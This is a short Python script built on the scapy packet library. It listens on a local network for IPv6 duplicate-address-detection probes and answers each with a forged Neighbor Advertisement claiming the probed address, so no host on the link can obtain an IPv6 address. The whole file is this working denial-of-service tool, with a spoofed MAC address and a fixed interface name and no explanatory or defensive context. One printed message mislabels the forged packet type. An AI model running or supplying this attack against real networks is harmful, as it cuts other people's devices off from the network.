# coding:utf-8
#! /usr/bin/env python
from scapy.all import *

def ipv6_monitor_callback(pkt):
    if IPv6 in pkt:
        if ICMPv6ND_NS in pkt:
            if pkt[IPv6].src == "::":
                print "ether src:",pkt[Ether].src
                print "ether dst:",pkt[Ether].dst
                print "ipv6 src:",pkt[IPv6].src
                print "ipv6 dst:",pkt[IPv6].dst
                target_address = pkt[ICMPv6ND_NS].tgt
                print "target address:",target_address
                forge_na_pkt(target_address)
                #forge_ns_pkt(target_address)
def forge_ns_pkt(target_address):
    ether=Ether(src='8c:ec:4b:73:25:8d',dst='33:33:ff:e4:89:00')
    #a=IPv6(src='fe80::437f:2137:3e16:b6ea', dst='ff02::1')
    a=IPv6(src="::", dst='ff02::1:ff21:41f')
    b=ICMPv6ND_NS(tgt=target_address)
    print "send NS packet target address:",target_address
    sendp(ether/a/b,iface="enp0s31f6")    

def forge_na_pkt(target_address):
    ether=Ether(src='8c:ec:4b:73:25:8d',dst='33:33:00:00:00:01')
    #a=IPv6(src='fe80::437f:2137:3e16:b6ea', dst='ff02::1')
    a=IPv6(src=target_address, dst='ff02::1')
    b=ICMPv6ND_NA(tgt=target_address)
    print "send NS packet target address:",target_address
    sendp(ether/a/b,iface="enp0s31f6")

#build_ns_na_pkt()
sniff(filter="ip6",prn=ipv6_monitor_callback,iface="enp0s31f6",count=0)